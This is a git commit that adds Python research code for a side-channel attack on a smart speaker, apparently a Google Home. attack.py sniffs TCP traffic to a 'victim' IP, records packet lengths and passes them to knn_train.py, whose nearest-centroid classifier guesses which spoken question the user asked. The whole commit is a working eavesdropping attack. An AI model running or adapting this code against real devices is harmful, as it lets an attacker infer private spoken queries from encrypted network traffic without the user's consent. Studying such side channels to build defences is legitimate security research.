ee4c7fbe9011278020688bdc69047547be3f9d86
yinhaoxiao <xyh3984@gwu.edu>
2017-02-20 18:00:32 -0500

    Speech Inference Completed

---
+++ Speech Inference/attack.py
@@ -0,0 +1,68 @@
+import argparse
+import time
+from PacketSniffer import PacketSniffer
+import knn_train
+
+sound_dir = 'speech_train/'
+speech_label = 1
+packet_collect_dir = 'packet_collect/'
+
+thresh_len = 200 #threshold length of a packet, if <, drop
+collect_duration = 20 #duration to collect packets
+total_train_sound = 10 #total number of training sound files
+each_train_trials = 50 #how many times each sound trains
+
+ap = argparse.ArgumentParser()
+ap.add_argument('-i', nargs=1)
+ap.add_argument('-v', nargs=1)
+
+opts = ap.parse_args()
+interface = opts.i[0]
+victim_ip = opts.v[0]
+
+victim_ip_parts = victim_ip.split('.')
+victim_ip = ''
+for victim_ip_part in victim_ip_parts:
+    hex_part = hex(int(victim_ip_part)).split('x')[1]
+    if len(hex_part) == 1:
+        hex_part = '0' + hex_part
+
+    victim_ip += hex_part
+
+packet_snf = PacketSniffer(interface)
+google_home_ip_hex = victim_ip
+
+play_count = 0
+
+timeout = time.time() + collect_duration
+
+target_packets = []
+
+while True:
+    tcp_flag = packet_snf.get_tcp_package()
+
+    if time.time() > timeout:
+        print 'Collection timeout, break the loop!'
+        break
+
+    if tcp_flag and \
+        packet_snf.tcp_packet_hex[packet_snf.DestIP_Start:packet_snf.DestIP_End] == google_home_ip_hex:
+
+        #useless traffic, skip
+        if len(packet_snf.tcp_packet_hex) <= thresh_len:
+            continue
+
+        print 'collecting......'
+        target_packets.append(len(packet_snf.tcp_packet_hex))
+
+question_list_file = 'speech_train/question_list.txt'
+q_f = open(question_list_file, 'r')
+question_index = knn_train.get_knn_prediction(target_packets)
+lines = []
+for line in q_f:
+    lines.append(line)
+
+print
+print
+print 'It is mostly likely you asked:'
+print lines[question_index-1]
---
+++ Speech Inference/knn_train.py
@@ -0,0 +1,37 @@
+from sklearn.neighbors.nearest_centroid import NearestCentroid
+import numpy as np
+
+def rotate(l, n):
+    return l[-n:] + l[:-n]
+
+max_len = 300
+
+# x_data is int list
+def get_knn_prediction(x_data):
+    packet_collect_dir = 'packet_collect/'
+    x_list = []
+    y_list = []
+
+    for i in range(1, 11):
+        file_path = packet_collect_dir + 'speech%d.txt' % i
+        f = open(file_path, 'r')
+        for line in f:
+            numbers_str = line.split(' ')[0: len(line.split(' ')) - 1]
+            numbers = map(int, numbers_str)
+
+            for j in range(max_len - len(numbers)):
+                numbers.append(0)
+
+            x_list.append(numbers)
+            y_list.append(i)
+
+    X = np.array(x_list)
+    Y = np.array(y_list)
+    clf = NearestCentroid()
+    clf.fit(X, Y)
+
+    if len(x_data) < max_len:
+        for j in range(max_len - len(x_data)):
+            x_data.append(0)
+
+    return clf.predict([x_data])[0]
